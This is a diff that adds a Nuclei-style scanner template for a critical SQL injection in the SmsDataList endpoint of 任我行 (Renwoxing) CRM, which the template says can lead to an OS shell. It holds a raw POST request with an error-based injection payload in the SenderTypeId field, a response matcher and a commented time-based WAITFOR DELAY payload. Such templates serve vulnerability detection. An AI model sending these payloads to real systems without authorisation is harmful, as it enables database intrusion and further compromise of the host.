@@ -1,0 +1,34 @@
+id: renwoxing-crm-SmsDataList-sqli
+
+info:
+  name: 任我行CRM SmsDataList - SQL injection
+  author: H0nayuzu
+  severity: critical
+  description: 任我行CRM SmsDataList - SQL注入 可os-shell
+  tags: crm,sqli
+
+http:
+  - raw:
+      - |
+        POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
+
+        Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000'+AND+5952+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(107)%2bCHAR(106)%2bCHAR(113)%2b(SELECT+(CASE+WHEN+(5952%3d5952)+THEN+CHAR(49)+ELSE+CHAR(48)+END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(118)%2bCHAR(112)%2bCHAR(113)))--+fKAv
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "qxkjq1qxvpq"
+
+# Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000';WAITFOR+DELAY+'0:0:5'--
